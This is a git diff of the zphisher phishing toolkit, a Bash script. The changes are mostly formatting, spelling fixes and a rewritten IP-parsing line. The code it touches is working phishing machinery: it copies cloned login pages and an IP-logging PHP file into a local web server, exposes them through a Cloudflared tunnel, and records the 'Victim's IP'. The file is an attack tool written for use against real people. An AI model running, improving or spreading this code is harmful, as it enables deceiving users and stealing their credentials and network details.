@@ -157,27 +157,27 @@ kill_pid() {
 
 # Check for a newer release
 check_update(){
-    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-    relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
 
-    if [[ $(curl -s $relase_url | grep '"tag_name":' | awk -F\" '{print $4}') != $__version__ ]]; then
-        echo -ne "${ORANGE} update found\n"${WHITE}
+	if [[ $(curl -s $relase_url | grep '"tag_name":' | awk -F\" '{print $4}') != $__version__ ]]; then
+		echo -ne "${ORANGE} update found\n"${WHITE}
 		sleep 1
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Updating..."
 		git pull origin master
 		{ clear; banner_small; }
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again"${WHITE}
 		exit
-    else
-        echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
-    fi
+	else
+		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+	fi
 }
 
 ## Check Internet Status
 check_status() {
-    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
-    timeout 3s curl -fIs "https://api.github.com" > /dev/null
-    [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+	timeout 3s curl -fIs "https://api.github.com" > /dev/null
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
 
 ## Banner
@@ -385,10 +385,10 @@ HOST='127.0.0.1'
 #DEFAULT PORT
 PORT='8080' 
 
-#COUSTOM PORT
+#CUSTOM PORT
 cusport() {
 	echo ""
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Coustom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		printf "\n\n"
 		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port 1024-9999 : ${WHITE}" CU_P
@@ -397,19 +397,19 @@ cusport() {
 			echo ""
 		else
 			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
-                        { sleep 2; clear; banner; cusport; }
+			{ sleep 2; clear; banner; cusport; }
 		fi
 	elif [[ ${P_ANS} =~ ^([Nn])$ ]];then
 		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port : $PORT...${WHITE}"
 		echo ""
 	else 
 		echo ""
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${WHITE}"
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${WHITE}"
 		cusport
 	fi
 }
 setup_site() {
-    	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
@@ -418,7 +418,7 @@ setup_site() {
 
 ## Get IP address
 capture_ip() {
-	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
@@ -482,8 +482,8 @@ start_ngrok() {
 
 ## Start Cloudflared
 start_cloudflared() { 
-    rm .cld.log > /dev/null 2>&1 &
-        cusport
+	rm .cld.log > /dev/null 2>&1 &
+	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
